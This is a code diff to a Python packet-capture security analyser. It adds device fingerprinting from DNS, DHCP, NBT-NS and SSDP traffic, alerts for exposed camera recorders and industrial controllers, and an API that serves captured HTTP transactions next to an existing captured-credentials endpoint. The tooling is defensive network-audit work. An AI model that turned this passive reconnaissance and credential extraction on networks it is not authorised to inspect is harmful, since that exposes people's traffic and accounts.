+                 key=("dev-console", ip))
+
+        # --- CCTV NVR / DVR distinct from camera (Hikvision NVR Web/SDK, Dahua NVR) ---
+        if (8000 in ports and 80 in ports and 554 in ports and 37777 not in ports
+            and 8554 in ports) or "iVMS" in srv or "DSS" in srv:
+            fire("high",
+                 f"Surveillance NVR/DVR at {ip}",
+                 f"NVR/DVRs aggregate every camera's stream and credentials. Same CVE "
+                 f"families as the cameras themselves (Hikvision SDK / Dahua DVRIP) plus "
+                 f"often a Linux shell on the management port.",
+                 evidence=f"vendor={vendor} ports={sorted(ports & {8000, 80, 554, 8554, 37777, 22, 23})}",
+                 rem="Patch the NVR firmware; force a unique strong password; "
+                     "VLAN segregate cameras + NVR from user/internet.",
+                 key=("dev-nvr", ip))
+
+        # --- ICS / OT direct controllers (re-emit under device-exposure for the playbook chain) ---
+        ot_ports = {502:"Modbus", 102:"S7", 20000:"DNP3", 2404:"IEC-104",
+                    44818:"EtherNet/IP", 47808:"BACnet", 4840:"OPC-UA",
+                    9600:"Omron FINS"}
+        ot_hit = {p: ot_ports[p] for p in ports if p in ot_ports}
+        if ot_hit:
+            fire("critical",
+                 f"ICS/OT controller at {ip} — {', '.join(ot_hit.values())}",
+                 f"Industrial protocol with no auth by design. Modbus/S7/DNP3 grant "
+                 f"READ and WRITE — actuating in production can injure people.",
+                 evidence=", ".join(f"{p}={n}" for p, n in ot_hit.items()),
+                 rem="OT segment behind a one-way data diode; never expose to the IT VLAN.",
+                 key=("dev-ot", ip))
+
+    def _d_dns_response(self, src, dport, dns):
+        """Harvest hostnames from DNS / mDNS responses.
+
+        A-record  with name X. -> X advertises ownership of the resolved IP.
+        AAAA same. PTR responses give rDNS for the queried address.
+        We populate mdns_local_name for LAN IPs and rdns_name for any IP.
+        """
+        if DNSRR is None:
+            return
+        is_mdns = dport == 5353
+        for section in (dns.an, dns.ar):
+            rr = section
+            while rr:
+                try:
+                    rtype = int(getattr(rr, "type", 0))
+                    rname = rr.rrname.decode("utf-8", errors="replace").rstrip(".") if rr.rrname else None
+                    rdata = rr.rdata
+                except Exception:
+                    rr = rr.payload if hasattr(rr, "payload") else None
+                    continue
+                # A / AAAA: rname owns the IP in rdata.
+                if rtype in (1, 28) and isinstance(rdata, str) and rname:
+                    try:
+                        ip = rdata
+                        h = self._get_host(ip)
+                        if is_mdns and rname.endswith(".local") and not h.get("mdns_local_name"):
+                            # ".local" mDNS hostnames are device-claimed names.
+                            h["mdns_local_name"] = rname[:-len(".local")] if rname.endswith(".local") else rname
+                        if not is_mdns and not h.get("rdns_name"):
+                            h["rdns_name"] = rname
+                    except Exception:
+                        pass
+                # PTR: reverse lookup — rdata is the hostname, rname encodes the IP.
+                elif rtype == 12 and rname and isinstance(rdata, (str, bytes)):
+                    try:
+                        name = rdata.decode("utf-8", errors="replace") if isinstance(rdata, (bytes, bytearray)) else str(rdata)
+                        name = name.rstrip(".")
+                        ip = None
+                        if rname.endswith(".in-addr.arpa"):
+                            parts = rname[:-len(".in-addr.arpa")].split(".")
+                            if len(parts) == 4:
+                                ip = ".".join(reversed(parts))
+                        if ip:
+                            h = self._get_host(ip)
+                            if not h.get("rdns_name"):
+                                h["rdns_name"] = name
+                        # mDNS service PTR like _airplay._tcp.local → MyTV._airplay._tcp.local
+                        # also marks the SRC host as having that friendly name.
+                        if is_mdns and name and "._" not in rname and rname.endswith(".local"):
+                            sh = self._get_host(src)
+                            if not sh.get("mdns_local_name"):
+                                sh["mdns_local_name"] = name
+                    except Exception:
+                        pass
+                rr = rr.payload if hasattr(rr, "payload") else None
+
+    def _d_dhcp(self, pkt, src):
+        """Pull DHCP option 12 (hostname) and option 60 (vendor class id)."""
+        if BOOTP is None or DHCP is None or BOOTP not in pkt or DHCP not in pkt:
+            return
+        # client MAC from BOOTP chaddr — useful when src IP is 0.0.0.0 (DISCOVER)
+        try:
+            chaddr = bytes(pkt[BOOTP].chaddr)[:6]
+            client_mac = ":".join(f"{b:02x}" for b in chaddr)
+        except Exception:
+            client_mac = None
+        opts = pkt[DHCP].options or []
+        hostname = None
+        vendor_class = None
+        is_client = False
+        for o in opts:
+            if not isinstance(o, tuple) or not o:
+                continue
+            k = o[0]
+            v = o[1] if len(o) > 1 else None
+            if k == "hostname" and v:
+                try: hostname = v.decode("utf-8", errors="replace") if isinstance(v, (bytes, bytearray)) else str(v)
+                except Exception: hostname = None
+            elif k == "vendor_class_id" and v:
+                try: vendor_class = v.decode("utf-8", errors="replace") if isinstance(v, (bytes, bytearray)) else str(v)
+                except Exception: vendor_class = None
+            elif k == "message-type" and v in (1, 3, 8):
+                is_client = True  # DISCOVER/REQUEST/INFORM come from the client
+        # Attribute to source IP if routable; else to the client MAC's host record (best-effort).
+        target_ip = src if (src and src != "0.0.0.0") else None
+        if target_ip:
+            h = self._get_host(target_ip)
+            if hostname and not h.get("dhcp_hostname"):
+                h["dhcp_hostname"] = hostname
+            if vendor_class and not h.get("dhcp_vendor_class"):
+                h["dhcp_vendor_class"] = vendor_class
+            if client_mac and not h.get("mac"):
+                h["mac"] = client_mac
+        elif client_mac:
+            # 0.0.0.0 case — stash for later (a host record may appear once it gets a lease).
+            self._dhcp_by_mac[client_mac] = {
+                "hostname": hostname, "vendor_class": vendor_class,
+            }
+
     def _d_name_resolution(self, src, dst, dport, payload):
         if dport == 5355:
             self._add_finding("high", "spoofable-resolution",
@@ -1381,6 +3961,14 @@ class PcapAnalysis:
                     hosts=[src], port=137, evidence=qname,
                     remediation="Create an authoritative internal WPAD DNS entry pointing to a dead IP or disable WinHTTP auto-proxy.",
                     key=("wpad-nbns", src))
+            # NBT-NS name registration / refresh queries reveal the host's own NetBIOS name.
+            # Filter out wildcard / empty registrations ("*"/blank) and the broadcast WORKGROUP name.
+            if qname:
+                name = qname.strip().rstrip("$").rstrip("\x00")
+                if name and name != "*" and name != "\x01\x02__MSBROWSE__\x02":
+                    h = self._get_host(src)
+                    if not h.get("nbns_name"):
+                        h["nbns_name"] = name
         elif dport == 5353:
             self._add_finding("medium", "spoofable-resolution",
                 "mDNS queries observed",
@@ -2143,6 +4731,28 @@ class PcapAnalysis:
                 hosts=[src], port=1900,
                 remediation="Disable UPnP on consumer gear; block SSDP at perimeter.",
                 key=("ssdp", src))
+        # Any SSDP message from a device — capture its Server: header for identity.
+        try:
+            head = payload[:1024].decode("latin1", errors="replace")
+        except Exception:
+            return
+        for line in head.split("\r\n"):
+            kv = line.split(":", 1)
+            if len(kv) != 2:
+                continue
+            k = kv[0].strip().lower()
+            v = kv[1].strip()
+            if not v:
+                continue
+            if k == "server":
+                h = self._get_host(src)
+                if not h.get("ssdp_server"):
+                    h["ssdp_server"] = v[:200]
+            elif k == "user-agent" and src and src != dst:
+                # NOTIFY uses USER-AGENT for the same purpose on some stacks.
+                h = self._get_host(src)
+                if not h.get("ssdp_server"):
+                    h["ssdp_server"] = v[:200]
 
     def _d_radius(self, src, dst, dport, payload):
         if len(payload) < 20:
@@ -2372,6 +4982,8 @@ class PcapAnalysis:
                             # Responses originate from the server; key hygiene checks off the server side.
                             if http_text.startswith("HTTP/"):
                                 self._d_http_response(src, dst, sport if sport in (80,8080,8000,8888) else dport, http_text)
+                            # Global HTTP req/resp pair feed.
+                            self._d_http_transaction(ts, src, dst, sport, dport, http_text)
                         except Exception:
                             pass
                     if dport == 3389 or sport == 3389:
@@ -2409,6 +5021,8 @@ class PcapAnalysis:
 
             if dport in (5355, 137, 5353):
                 self._d_name_resolution(src, dst, dport, payload)
+            if dport in (67, 68) or sport in (67, 68):
+                self._d_dhcp(pkt, src)
             if dport == 547:
                 self._d_dhcpv6(src, dst)
             if dport == 69 or sport == 69:
@@ -2444,18 +5058,22 @@ class PcapAnalysis:
                     src_host["encrypted_services"].add(svc)
                     dst_host["encrypted_services"].add(svc)
 
-            if DNS is not None and DNS in pkt and pkt[DNS].qr == 0 and pkt[DNS].qd:
-                try:
-                    qname = pkt[DNS].qd.qname.decode("utf-8", errors="replace").rstrip(".")
-                    qtype = int(pkt[DNS].qd.qtype)
-                    self.dns_queries.append({
-                        "ts": ts, "src": src, "query": qname, "qtype": qtype,
-                    })
-                    src_host["dns_names"].add(qname)
-                    self._d_dns_extras(qname, src)
-                    self._d_dns_query_vuln(qname, qtype, src)
-                except Exception:
-                    pass
+            if DNS is not None and DNS in pkt:
+                dns = pkt[DNS]
+                if dns.qr == 0 and dns.qd:
+                    try:
+                        qname = dns.qd.qname.decode("utf-8", errors="replace").rstrip(".")
+                        qtype = int(dns.qd.qtype)
+                        self.dns_queries.append({
+                            "ts": ts, "src": src, "query": qname, "qtype": qtype,
+                        })
+                        src_host["dns_names"].add(qname)
+                        self._d_dns_extras(qname, src)
+                        self._d_dns_query_vuln(qname, qtype, src)
+                    except Exception:
+                        pass
+                elif dns.qr == 1 and (dns.an or dns.ar):
+                    self._d_dns_response(src, dport, dns)
 
             self._store_packet(ts, src, dst, "UDP", size,
                                sport=sport, dport=dport,
@@ -2490,6 +5108,40 @@ class PcapAnalysis:
             self._store_packet(ts, src, dst, f"IP/{proto_num}", size)
 
     def _finalize(self):
+        # Roll up device identity for every host.
+        for ip, h in self.hosts.items():
+            # Skip multicast / broadcast / unspecified pseudo-hosts.
+            if h.get("is_multicast") or ip in ("0.0.0.0", "255.255.255.255", "::"):
+                continue
+            # 1. Backfill MAC from arp_table if we learned it there but the host record missed.
+            if not h.get("mac"):
+                macs = self.arp_table.get(ip)
+                if macs:
+                    h["mac"] = next(iter(macs))
+            # 2. Backfill DHCP hints stashed under MAC (DISCOVER from 0.0.0.0).
+            if h.get("mac") and h["mac"] in self._dhcp_by_mac:
+                stash = self._dhcp_by_mac[h["mac"]]
+                if stash.get("hostname") and not h.get("dhcp_hostname"):
+                    h["dhcp_hostname"] = stash["hostname"]
+                if stash.get("vendor_class") and not h.get("dhcp_vendor_class"):
+                    h["dhcp_vendor_class"] = stash["vendor_class"]
+            # 3. Vendor from MAC OUI.
+            if not h.get("vendor"):
+                h["vendor"] = lookup_vendor(h.get("mac"))
+            # 4. Hostname: pick the best across all sources.
+            if not h.get("hostname"):
+                h["hostname"] = pick_hostname(h)
+            # 5. Device-type heuristic.
+            if not h.get("device_type"):
+                h["device_type"] = infer_device_type(h)
+            # 6. Reputation re-check — feeds may have finished loading after the
+            # initial _get_host call set tags to [].
+            if not h.get("reputation_tags"):
+                self._check_reputation(ip)
+            # 7. Device-specific exposure detector — emits findings keyed on the
+            # vendor / device_type / SSDP-Server / ports the prior steps populated.
+            self._d_device_recon(ip, h)
+
         for ip, macs in self.arp_table.items():
             if len(macs) > 1:
                 self._add_finding("critical", "arp-spoof",
@@ -2660,6 +5312,20 @@ class PcapAnalysis:
                 "findings_by_severity": {k: sev_counts.get(k, 0)
                                          for k in ["critical", "high", "medium", "low", "info"]},
                 "live": live,
+                # Count of public hosts that still don't have whois fields populated.
+                # The UI polls while this is nonzero so labels light up as RDAP responses land.
+                "whois_pending": sum(
+                    1 for h in self.hosts.values()
+                    if not (h.get("is_private") or h.get("is_multicast"))
+                       and h.get("whois_org") is None and h.get("whois_country") is None
+                ),
+                "http_txn_count": len(self.http_txns),
+                # Reputation-feed status, useful in the UI banner.
+                "reputation": {
+                    "ready": reputation_feeds.ready.is_set(),
+                    "feeds": list(reputation_feeds.feed_stats.values()),
+                    "malicious_hosts": sum(1 for h in self.hosts.values() if h.get("malicious")),
+                },
             }
 
     def to_graph_json(self):
@@ -2677,6 +5343,17 @@ class PcapAnalysis:
                 "protocols": sorted(h["protocols"]),
                 "risk_score": h["risk_score"],
                 "finding_count": len(h["finding_keys"]),
+                # identity fields surfaced into the graph for labeling & tooltips
+                "mac": h.get("mac"),
+                "vendor": h.get("vendor"),
+                "hostname": h.get("hostname"),
+                "device_type": h.get("device_type"),
+                "whois_org": h.get("whois_org"),
+                "whois_country": h.get("whois_country"),
+                "whois_asn": h.get("whois_asn"),
+                "rdns_name": h.get("rdns_name"),
+                "malicious": h.get("malicious", False),
+                "reputation_tags": h.get("reputation_tags") or [],
             } for ip, h in self.hosts.items()]
             links = [{
                 "source": src,
@@ -2750,6 +5427,20 @@ class PcapAnalysis:
             "findings": host_findings[:80],
             "risk_score": h["risk_score"],
             "mac": h.get("mac"),
+            "vendor": h.get("vendor"),
+            "hostname": h.get("hostname"),
+            "device_type": h.get("device_type"),
+            "dhcp_hostname": h.get("dhcp_hostname"),
+            "dhcp_vendor_class": h.get("dhcp_vendor_class"),
+            "nbns_name": h.get("nbns_name"),
+            "mdns_local_name": h.get("mdns_local_name"),
+            "ssdp_server": h.get("ssdp_server"),
+            "rdns_name": h.get("rdns_name"),
+            "whois_org": h.get("whois_org"),
+            "whois_country": h.get("whois_country"),
+            "whois_asn": h.get("whois_asn"),
+            "malicious": h.get("malicious", False),
+            "reputation_tags": h.get("reputation_tags") or [],
         }
 
 
@@ -3035,6 +5726,44 @@ def api_credentials():
     if not analysis:
         return jsonify({"error": "no pcap loaded"}), 404
     return jsonify({"credentials": analysis.credentials})
+
+
+@app.route("/api/http")
+def api_http():
+    """Global feed of paired HTTP request/response transactions across all hosts.
+
+    Query params:
+      ?q=<substr>            substring filter (case-insensitive) across method/host/path/body
+      ?host=<ip>             only transactions where ip is client or server
+      ?limit=<n>             cap to last n (default 500, max 2000)
+    """
+    if not analysis:
+        return jsonify({"error": "no pcap loaded"}), 404
+    q = (request.args.get("q") or "").lower().strip()
+    host_filter = (request.args.get("host") or "").strip() or None
+    try:
+        limit = max(1, min(2000, int(request.args.get("limit", "500"))))
+    except Exception:
+        limit = 500
+    with analysis.lock:
+        txns = list(analysis.http_txns)
+    if host_filter:
+        txns = [t for t in txns if t.get("client") == host_filter or t.get("server") == host_filter]
+    if q:
+        def hit(t):
+            for k in ("request", "response"):
+                v = t.get(k)
+                if v and q in v.lower():
+                    return True
+            return False
+        txns = [t for t in txns if hit(t)]
+    # Return newest first up to `limit`.
+    txns = list(reversed(txns[-limit:]))
+    return jsonify({
+        "total": len(analysis.http_txns),
+        "shown": len(txns),
+        "transactions": txns,
+    })
 
 
 @app.route("/api/flow/<path:src>/<path:dst>")
